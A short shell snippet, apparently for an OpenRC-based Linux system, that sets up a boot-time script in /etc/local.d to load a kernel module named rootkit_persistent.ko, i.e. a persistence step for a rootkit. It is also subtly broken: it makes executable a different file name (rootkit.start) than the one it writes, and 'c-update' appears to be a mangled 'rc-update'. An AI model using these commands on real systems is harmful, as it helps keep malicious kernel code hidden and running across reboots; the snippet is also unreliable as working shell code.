echo "#!/bin/sh" > /etc/local.d/my_startup.start

echo "insmod /opt/mymodules/rootkit_persistent.ko" >> /etc/local.d/my_startup.start

chmod +x /etc/local.d/rootkit.start

#Adds the local service to the default runlevel
c-update add local default

